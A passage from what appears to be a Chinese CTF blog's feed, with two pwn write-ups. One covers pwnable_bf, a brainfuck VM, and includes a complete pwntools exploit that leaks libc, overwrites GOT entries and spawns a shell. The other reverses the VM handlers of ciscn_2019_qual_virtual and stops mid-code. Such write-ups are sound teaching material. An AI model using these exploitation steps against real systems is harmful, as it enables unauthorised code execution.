            <tag> 每周一pwn系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-12第三周：pwnable_bf</title>
      <link href="/2024/12/19/2024-12%E7%AC%AC%E4%B8%89%E5%91%A8%EF%BC%9Apwnable_bf/"/>
      <url>/2024/12/19/2024-12%E7%AC%AC%E4%B8%89%E5%91%A8%EF%BC%9Apwnable_bf/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目地址：<a href="https://buuoj.cn/challenges#pwnable_bf">BUUCTF在线评测</a><br>vmpwn专题-2</p></blockquote><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="/EXP_FILE/cd644ea16a968acdba5a681a792795f3_MD5.jpeg"></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>一个brainfuck虚拟机<br><img src="/EXP_FILE/b67c8a860502406ff58f392b38fe6b16_MD5.jpeg"><br>p是一个全局指针，指向 bss段的 tape </p><p>对opcode的解析相对比较简单<br><img src="/EXP_FILE/d6a656b9d268ab3149335e6f8ab74fdc_MD5.jpeg"></p><ul><li>“+”：++*p，tape存储的值+1</li><li>“,”：输入一个字节到*p</li><li>“-“：–*p，tape存储的值-1</li><li>“.”：打印*p一个字节 </li><li>“&lt;”：–p，p所指地址-1</li><li>“&gt;”：++p，p所指地址+1</li><li>“[“：没用</li></ul><p>因为没对p做出任何限制，所以可以任意地址读写</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>现在能做的：</p><ol><li>增&#x2F;减任意地址一字节</li><li>输入&#x2F;输出任意地址任意字节<br>partial relro，bss 又离 GOT 很近，可以直接改 GOT 表</li></ol><p>我一开始想如何泄露完libc后再回到main上，改GOT为main？</p><p>其实不需要，opcode先泄露再输入，这样泄露完libc后程序会等待输入，我们就可以改GOT了</p><p>发现改成one_gadget没用，那么只能走system(‘&#x2F;bin&#x2F;sh’)，但是putchar只能传参一字节，不好直接构造，还是得回到main上<br><img src="/EXP_FILE/7652a8e59b639c045f0b226f95deb0c0_MD5.jpeg"></p><p>思路：</p><ol><li>先打印puts地址泄露libc</li><li>改putchar为main，改memset为gets，改fgets为system，然后回到main时输入 ‘&#x2F;bin&#x2F;sh’<br><img src="/EXP_FILE/b3dc8f8d90135764a3f77fb5964215ca_MD5.jpeg"><br>我一开始想改puts为main，但是主函数还会调用puts，这就相当于调用了很多次main导致程序异常。改putchar就很好，毕竟已经泄露过了libc</li></ol><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#,</span><span class="token comment">#dbg('b *0x0804865A')</span><span class="token comment">#+</span><span class="token comment">#dbg('b *0x08048665')</span><span class="token comment">#leak puts</span>payload<span class="token operator">=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x88</span>payload<span class="token operator">+=</span><span class="token string">'.>.>.>.'</span>payload<span class="token operator">+=</span><span class="token string">'&lt;&lt;&lt;'</span><span class="token comment">#putchar</span>payload<span class="token operator">+=</span><span class="token string">'>'</span><span class="token operator">*</span><span class="token number">0x18</span>payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span><span class="token comment">#memset</span>payload<span class="token operator">+=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x8</span>payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span><span class="token comment">#fgets</span>payload<span class="token operator">+=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x20</span>payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span>payload<span class="token operator">+=</span><span class="token string">'.'</span>sla<span class="token punctuation">(</span><span class="token string">'except [ ]'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts<span class="token operator">=</span>u32<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>puts<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x8048671'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x8048671</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'gets'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x3a80c execve("/bin/sh", esp+0x28, environ)constraints:  esi is the GOT address of libc  [esp+0x28] == NULL0x3a80e execve("/bin/sh", esp+0x2c, environ)constraints:  esi is the GOT address of libc  [esp+0x2c] == NULL0x3a812 execve("/bin/sh", esp+0x30, environ)constraints:  esi is the GOT address of libc  [esp+0x30] == NULL0x3a819 execve("/bin/sh", esp+0x34, environ)constraints:  esi is the GOT address of libc  [esp+0x34] == NULL0x5f065 execl("/bin/sh", eax)constraints:  esi is the GOT address of libc  eax == NULL0x5f066 execl("/bin/sh", [esp])constraints:  esi is the GOT address of libc  [esp] == NULL'''</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./bf'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每周一pwn系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-12第二周：ciscn_2019_qual_virtual</title>
      <link href="/2024/12/13/2024-12%E7%AC%AC%E4%BA%8C%E5%91%A8%EF%BC%9Aciscn_2019_qual_virtual/"/>
      <url>/2024/12/13/2024-12%E7%AC%AC%E4%BA%8C%E5%91%A8%EF%BC%9Aciscn_2019_qual_virtual/</url>
      
        <content type="html"><![CDATA[<blockquote><p>赛题地址：<a href="https://buuoj.cn/challenges#ciscn_2019_qual_virtual">BUUCTF在线评测</a></p></blockquote><p>vmpwn初探</p><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="/EXP_FILE/6b35aee306536e9016983f2737a30397_MD5.jpeg"></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><h2 id="各虚拟段初始化"><a href="#各虚拟段初始化" class="headerlink" title="各虚拟段初始化"></a>各虚拟段初始化</h2><p><img src="/EXP_FILE/cbad4ec09039da31682729a93cf874c9_MD5.jpeg"><br>如图：<br><img src="/EXP_FILE/eab6d937744654ea3eadfbf50981a3ad_MD5.jpeg"></p><h2 id="opcode解析部分"><a href="#opcode解析部分" class="headerlink" title="opcode解析部分"></a>opcode解析部分</h2><p>将我们输入的指令转为opcode<br><img src="/EXP_FILE/ec885429b943018f0189461ba9692f22_MD5.jpeg"></p><ul><li>copy<br>即以每8字节为单位赋值：<code>*(segment+idx++)=a2</code><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">copy</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                 <span class="token comment">// 0</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>              <span class="token comment">// if(v3==size)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>a1 <span class="token operator">+</span> v3<span class="token punctuation">)</span> <span class="token operator">=</span> a2<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>                     <span class="token comment">// idx=v3</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="opcode执行部分"><a href="#opcode执行部分" class="headerlink" title="opcode执行部分"></a>opcode执行部分</h2><p><img src="/EXP_FILE/b17e9f18d757fb913521b21fb1beddb5_MD5.jpeg"></p><ul><li>get<br>即取出 opcode 并返回：<code>*a2=*(segment+idx--)</code><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span>a2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>a1 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><hr><ul><li>push<pre class="line-numbers language-c" data-language="c"><code class="language-c">_BOOL8 __fastcall <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">get</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>从stack取出数据，放到data里</p><ul><li><p>pop</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_BOOL8 __fastcall <span class="token function">pop</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">copy</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data取出数据，放到stack里</p></li><li><p>add</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> v3 <span class="token operator">+</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相加，放到data</p></li><li><p>sub</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> a2 <span class="token operator">-</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相减，放到data</p></li><li><p>mul</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">mul</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> v3 <span class="token operator">*</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相乘，放到data</p></li><li><p>div</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">div</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> a2 <span class="token operator">/</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从data中取两个值相除，放到data</p></li><li><p>load</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 a2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">get</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">copy</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>data_addr <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>data_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token 